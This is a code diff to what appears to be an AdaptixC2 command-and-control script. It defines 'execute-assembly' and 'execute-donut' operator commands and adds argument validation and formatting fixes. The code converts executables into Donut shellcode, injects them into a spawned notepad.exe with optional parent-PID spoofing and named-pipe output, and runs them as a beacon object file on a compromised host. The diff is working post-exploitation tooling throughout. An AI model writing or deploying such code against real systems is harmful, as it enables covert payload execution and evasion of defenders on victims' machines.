@@ -10,9 +10,9 @@ cmd_execute_assembly.addArgString("path", true, "Path to .NET assembly");
 cmd_execute_assembly.addArgString("params", ".NET assembly parameters", "");
 cmd_execute_assembly.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let assembly_content = ax.file_read(parsed_json["path"]);
-    let assembly_params  = parsed_json["params"];
+    let assembly_params = parsed_json["params"];
 
-    if(assembly_content.length == 0) {
+    if (assembly_content.length == 0) {
         throw new Error(`file ${parsed_json["path"]} not readed`);
     }
 
@@ -31,45 +31,75 @@ cmd_execute_donut.addArgString("path", false, "Path to local EXE/DLL (Required f
 cmd_execute_donut.addArgString("params", false, "Arguments for the executable");
 cmd_execute_donut.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     var args = cmdline.split(" ");
-    
+
     var ppid = 0;
     var spawn = "notepad.exe";
     var arch = "x64";
     var exe_path = "";
     var exe_args = "";
-    
-    var action = 1; // 1=Async (Default)
+
     // Use a unique numeric ID for the job (using timestamp)
     var jobId = (Date.now() & 0xFFFFFFF); // Fit in positive int32
 
     var i = 1;
-    while(i < args.length) {
-        if(args[i] == "-P") {
-            ppid = parseInt(args[i+1]);
+    while (i < args.length) {
+        if (args[i] == "-P") {
+            if (i + 1 >= args.length) { ax.console_message(id, "Error", "error", "Missing value for -P"); return; }
+            ppid = parseInt(args[i + 1]);
             i += 2;
-        } else if(args[i] == "-p") {
-            spawn = args[i+1];
+        } else if (args[i] == "-p") {
+            if (i + 1 >= args.length) { ax.console_message(id, "Error", "error", "Missing value for -p"); return; }
+            spawn = args[i + 1];
             i += 2;
-        } else if(args[i] == "-a") {
-            arch = args[i+1];
+        } else if (args[i] == "-a") {
+            if (i + 1 >= args.length) { ax.console_message(id, "Error", "error", "Missing value for -a"); return; }
+            arch = args[i + 1];
             i += 2;
         } else {
-             if(exe_path == "") {
-                 exe_path = args[i];
-                 var rest = args.slice(i+1).join(" ");
-                 if(rest.length > 0) exe_args = rest;
-                 break;
-             }
-             i++;
+            if (exe_path == "") {
+                exe_path = args[i];
+                var rest = args.slice(i + 1).join(" ");
+                if (rest.length > 0) exe_args = rest;
+                break;
+            }
+            i++;
         }
+    }
+
+    // Adjust spawn for x86 if using default
+    if (arch == "x86" && spawn == "notepad.exe") {
+        spawn = "C:\\Windows\\SysWOW64\\notepad.exe";
     }
 
     var shellcode_b64 = "";
     var pipeName = "";
 
     // Generate Shellcode
-    if(exe_path == "") {
+    if (exe_path == "") {
         ax.console_message(id, "Error", "error", "No executable path provided");
+        return;
+    }
+
+    // Validate Architecture
+    if (arch == "x86") {
+        ax.console_message(id, "Error", "error", "x86 architecture is not supported currently.");
+        return;
+    }
+
+    if (arch != "x86" && arch != "x64") {
+        ax.console_message(id, "Error", "error", "Invalid architecture: " + arch + ". Must be x64 or x86.");
+        return;
+    }
+
+    // Validate PPID
+    if (isNaN(ppid)) {
+        ax.console_message(id, "Error", "error", "Invalid PPID provided");
+        return;
+    }
+
+    // Validate Architecture for Pipe Mode
+    if (ppid > 0 && arch != "x64" && arch != "x86") {
+        ax.console_message(id, "Error", "error", "Architecture must be x64 or x86 when using PPID spoofing");
         return;
     }
 
@@ -78,23 +108,30 @@ cmd_execute_donut.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines
         // Generate unique pipe name
         var timestamp = Date.now().toString(16).toUpperCase();
         pipeName = "\\\\.\\pipe\\dnt_" + timestamp.substring(timestamp.length - 8);
-        
-        // Use the pipe-enabled shellcode generator
-        shellcode_b64 = ax.donut_generate_with_pipe(exe_path, exe_args, arch, pipeName);
+
+        // Read the architecture-specific stub (returns Base64 string)
+        var stubBase64 = ax.file_read(ax.script_dir() + "execute-donut/pipe_shellcode/stub_" + arch + ".bin");
+        if (stubBase64.length == 0) {
+            ax.console_message(id, "Error", "error", "Failed to read redirect stub for " + arch);
+            return;
+        }
+
+        // Use the pipe-enabled shellcode generator with external stub
+        shellcode_b64 = ax.donut_generate_with_pipe(exe_path, exe_args, arch, pipeName, stubBase64);
     } else {
         // Normal shellcode (handle inheritance works without PPID)
         shellcode_b64 = ax.donut_generate(exe_path, exe_args, arch, "exe");
     }
-    
-    if(!shellcode_b64 || shellcode_b64.length == 0) {
-        return; 
+
+    if (!shellcode_b64 || shellcode_b64.length == 0) {
+        return;
     }
-    
-    // Pack: Action(i), JobId(i), PPID(i), Spawn(s), PipeName(s), Shellcode(b)
-    var bof_params = ax.bof_pack("int,int,int,cstr,cstr,bytes", [action, jobId, ppid, spawn, pipeName, shellcode_b64]);
+
+    // Pack: JobId(i), PPID(i), Spawn(s), PipeName(s), Shellcode(b)
+    // Removed 'action' from args
+    var bof_params = ax.bof_pack("int,int,cstr,cstr,bytes", [jobId, ppid, spawn, pipeName, shellcode_b64]);
     var bof_path = ax.script_dir() + "_bin/execute-donut." + ax.arch(id) + ".o";
-    var message = "Task: execute-donut (Action: " + action + ")";
-    if (action <= 1) message += " " + ax.file_basename(exe_path);
+    var message = "Task: execute-donut " + ax.file_basename(exe_path);
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
